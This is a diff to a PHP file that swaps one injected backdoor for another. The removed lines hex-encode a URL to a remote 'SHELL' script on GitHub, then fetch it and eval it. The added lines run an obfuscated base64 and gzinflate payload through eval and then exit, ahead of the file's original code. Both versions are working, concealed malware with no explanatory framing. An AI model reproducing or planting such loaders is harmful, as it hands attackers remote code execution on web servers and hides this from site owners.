@@ -1,16 +1,8 @@
-<?php goto opet_a98d3; opet_a98d3: $u="\x68\164\x74\160\x73\072\x2F\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6E\164\x65\156\x74\056\x63\157\x6D\057\x72\145\x6E\144\x69\150\x69\144\x61\171\x61\164\x36\070\x33\057\x77\145\x62\154\x69\163\x74\055\x53\110\x45\114\x4C\057\x72\145\x66\163\x2F\150\x65\141\x64\163\x2F\155\x61\151\x6E\057\x69\156\x64\145\x78\056\x70\150\x70";
-if(ini_get("\x61\154\x6C\157\x77\137\x75\162\x6C\137\x69\156\x63\154\x75\144\x65")){
-    include($u);
-}else{
-    $c=@file_get_contents($u);
-    if(!$c){
-        $ch=curl_init($u);
-        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>0]);
-        $c=curl_exec($ch);
-        curl_close($ch);
-    }
-    eval(' ?>'.$c);
-}
+<?php
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "=MJ26VFA+9oGdHb5avomtNaXP7upNyuWlvYEJ6EKFuUiAl4HaqITkyL4eH+GuuEqxLJ7WX+rJKXS5Lq5cPLZH2gXUa9bJbJXKikiRtQdkflYV0NPbF/B2niP97UP9u53zdG8+Sn/H2Ze+9nwJPp7okthpNA/5QlVdxNa4US2woKOFlhxoQaPeUzA6BDX1vx3g6n+D8upvRqH1pPUfo3pp/TT5dY59U8XKNvr6fU56tKs6pJ8ElHgIaG1+f6WMb5P/RvO7zRlW3o7+ZM3RqPX0RHQE9pu/X25ehy7+gbyYJ8zRR/rVCEOgWOPpb/CrFoxWIutjvxMUvdhx6GdUyVpRwB5HMriZS0RWcAYUWRqAhWJpUorUWkrWAHXLbFSkdL75UdwW0uJ57RvfgRGFTF5yBi7QthouogAPJpg38nOpBfnYG1cJPDEZTyd27cDGWtg4W0E0IZkp95I4M7jcn7L7We3f/ylWejVkK97/CvwOabLI2SctSRdnO9owt82cK1p2k+cpNKIsGRWPw/F+BBMCvWUSVHn45vaBUZA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
 <?php
 /**
